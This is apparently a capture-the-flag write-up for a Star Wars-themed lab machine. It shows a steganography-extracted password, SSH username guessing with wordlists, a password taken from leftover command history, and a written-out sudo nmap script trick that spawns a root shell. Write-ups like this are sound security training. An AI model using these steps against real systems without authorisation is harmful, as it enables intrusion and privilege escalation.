### Checking out admin:

![](/assets/images/20/20-006.jpg)

There is nothing there, the login does not actually go anywhere:

#### Checking robots.txt:

![](/assets/images/20/20-008.jpg)

##### Checking out r2d2:

![](/assets/images/20/20-009.jpg)

##### Creating a wordlist from this page, there are several star wars words on the page (tatooine, obi wan, etc):

![](/assets/images/20/20-010.png)

##### Downloading the two /assets/images (2 yodas seen on home page):

You can see they are vastly different sizes, there might be something hidden in one. ![](/assets/images/20/20-012.jpg)

### Stego:

Running stegoveritas on yoda.png:

![](/assets/images/20/20-013.png)

Result:

```
root​@kali​:~/Downloads/results/keepers​# cat 1599426719.9636476
the real password is babyYoda123
```

### SSH Login:

Finding the username to go with the password:

#### Trying the cewl wordlist:

![](/assets/images/20/20-015.png)

#### Using a star wars wordlist:

![](/assets/images/20/20-017.png)

### Login to SSH:

![](/assets/images/20/20-019.png) ![](/assets/images/20/20-021.png)

Oops I missed this:

![](/assets/images/20/20-023.png)

Trying the cewl wordlist with skywalker:

![](/assets/images/20/20-025.png)

### Privilege Escalation:

#### Logging in as skywalker:

![](/assets/images/20/20-027.png)  

This file suggests Darth must have a cronjob running:

```
skywalker​@starwars​:~​$ ​cat .secrets/note.txt
Darth must take up the job of being a good father
skywalker​@starwars​:~$ ​id -a
uid=​1001(skywalker) gid=​1001​(skywalker) groups=​1001​(skywalker),​2000​(anakin)
```

This must be the script run for the job, it must run every minute.

```
skywalker​@starwars​:/home/Darth/​.secrets​$ ​cat evil.py
# Let the fear flow through you every single minute
fear = ​ 1
anger = fear
hate = anger
suffering = hate
```

I looked for the job couldn’t find it.

### “Cheating” at Priv Esc:

Used this to get the password for Darth. (The creator of this box forgot to clear the command history) Combine these into luke12clone50, and log in to Darth.

#### Checking crontab:

![](/assets/images/20/20-035.png)

Oops I really messed up there.

#### Use nmap to get a root shell:

![](/assets/images/20/20-033.png)

Use mktemp to create a temporary file that can be executed with the nmap script param

```
Darth​@starwars​:/home/skywalker​$ TF=​$(mktemp)
Darth​@starwars​:/home/skywalker​$ echo ​ 'os.execute("/bin/sh")'​ > ​ $TF
Darth​@starwars​:/home/skywalker​$ sudo nmap --script=​ $TF
```

FIN.
